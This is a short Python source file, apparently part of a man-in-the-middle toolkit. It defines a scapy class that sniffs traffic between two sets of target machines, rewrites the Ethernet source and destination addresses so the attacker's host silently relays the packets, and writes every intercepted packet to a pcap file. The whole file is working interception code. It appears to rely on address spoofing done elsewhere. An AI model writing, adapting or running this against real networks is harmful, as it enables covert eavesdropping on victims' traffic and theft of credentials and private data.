import sys
import time
from scapy.all import *

class TrafficRedirect():
    interface = 0

    def __init__(self, intFace):
        self.interface = intFace

    def doRedirect(self, target1, target2, target1MAC, target2MAC, oneway, stop_event):
        sniffed_packets = []

        def makeFakePacket(pkt, target1, target2, target1MAC, target2MAC, interface):
            if pkt.haslayer(IP) and pkt.haslayer(Ether):
                # if source is target 1 then someone from target 2 must be the true reciever
                if pkt[Ether].src in target1MAC:
                    print("Traffic from machine 1")
                    found = False
                    # find true receiver (the mac of true receiver)
                    receiver = pkt[IP].dst
                    for i in range(len(target2)):
                        if receiver == target2[i]:
                            sniffed_packets.append(pkt)
                            # we are the source now cause target 2 thinks we are target 1
                            pkt[Ether].src = pkt[Ether].dst
                            # set the mac of the true receiver (someone from list target2)
                            pkt[Ether].dst = target2MAC[i]
                            found = True
                            break
                    # send the packet
                    if found:
                        sendp(pkt, iface=interface)
                # same but with source target 2
                elif pkt[Ether].src in target2MAC:
                    print("Traffic from machine 2")
                    found = False
                    receiver = pkt[IP].dst
                    for i in range(len(target1)):
                        if receiver == target1[i]:
                            sniffed_packets.append(pkt)
                            pkt[Ether].src = pkt[Ether].dst
                            pkt[Ether].dst = target1MAC[i]
                            found = True
                            break
                    if found:
                        sendp(pkt, iface=interface)

        def makeFakePacketOneWay(pkt, target2, target1MAC, target2MAC, interface):
            if pkt.haslayer(IP) and pkt.haslayer(Ether):
                # if source is target 1 then someone from target 2 must be the true receiver
                if pkt[Ether].src in target1MAC:
                    print("Traffic from machine 1")
                    found = False
                    # find true receiver (the mac of true receiver)
                    receiver = pkt[IP].dst

                    for i in range(len(target2)):
                        if receiver == target2[i]:
                            sniffed_packets.append(pkt)
                            # set the mac of the true receiver (someone from list target2)
                            pkt[Ether].dst = target2MAC[i]
                            found = True
                            break
                    # send the packet
                    if found:
                        sendp(pkt, iface=interface)
        if oneway:
            while not stop_event.is_set():
                sniff(count=1, store=0, prn=lambda pkt: makeFakePacketOneWay(pkt, target2, target1MAC, target2MAC, self.interface), iface=self.interface)
        else:
            while not stop_event.is_set():
                sniff(count=1, store=0, prn=lambda pkt: makeFakePacket(pkt, target1, target2, target1MAC, target2MAC, self.interface), iface=self.interface)
        wrpcap("sniffed.pcap", sniffed_packets)